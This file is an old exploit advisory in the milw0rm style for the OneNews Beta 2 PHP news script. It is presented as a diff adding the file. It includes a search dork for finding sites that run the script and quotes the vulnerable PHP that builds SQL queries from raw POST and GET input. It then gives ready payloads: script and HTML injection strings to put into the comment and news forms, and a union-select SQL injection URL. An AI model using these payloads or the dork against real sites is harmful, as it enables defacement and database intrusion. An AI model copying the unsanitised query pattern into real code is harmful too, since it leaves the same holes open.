@@ -1,0 +1,51 @@
+______________________///////////////\\\\\\\\\\\\\\\____________________
+}Name   : OneNews Beta 2 Multiple Vulnerabilities                      {
+{Author : suN8Hclf[crimsoN_Loyd9], (DaRk-CodeRs Group)                 }
+}Source : http://sourceforge.net/project/showfiles.php?group_id=193198 {
+{Dork   : Powered by One-News                                          }
+}Greetz : all DaRk-CodeRs guys, e.wiZz, str0ke                         {
+_________________________________{}*{}__________________________________
+
+
+==========================
+|1. XSS and html injection|
+==========================
+Conditions: MAGIC_QUOTES=ON/OFF
+Vulnerable code(add.php):
+--------------------------------------CODE----------------------------------------------
+$insert = "INSERT INTO entries (title, content) VALUES ('" . $_POST['title'] . "', '" . $_POST['content'] . "')";
+mysql_query($insert) or die ('I cannot do that because ' . mysql_error());
+--------------------------------------CODE----------------------------------------------
+Vulnerable code(index.php):
+--------------------------------------CODE----------------------------------------------
+$insert = "INSERT INTO comments (blogid, author, comment) VALUES ('" . $_POST['itemnum'] . "', '" . $_POST['author'] . "', '" . $_POST['comment'] . "')";
+mysql_query($insert) or die ('I cannot do that because ' . mysql_error());
+--------------------------------------CODE----------------------------------------------
+
+NOTE:
+To exploit the bug in the add.php code, you have got to be logged in!!!
+
+Exploit:
+Put this down into the forms, while adding comments(index.php) or news(add.php):
+
+1. <h1>HACKED</h1>
+2. <html><head></head><body bgcolor=\"red\">HACKED</body></html>
+3. <script>alert(\'Hacked\');</script>
+4. Use your imagination :)
+
+==========================
+|2. SQL Injection        |
+==========================
+Conditions: MAGIC_QUOTES=OFF
+Vulnerable code(index.php):
+--------------------------------------CODE----------------------------------------------
+$query = "SELECT * FROM entries WHERE id = '" . $_GET['q'] . "' LIMIT 1";
+$result = mysql_query($query);
+while($row = mysql_fetch_array($result)){ 
+--------------------------------------CODE----------------------------------------------
+
+Exploit:
+
+http://localhost:8080/onenews_beta2/index.php?q=3' and 1=2 union select 1,2,3/*
+
+# milw0rm.com [2008-08-23]
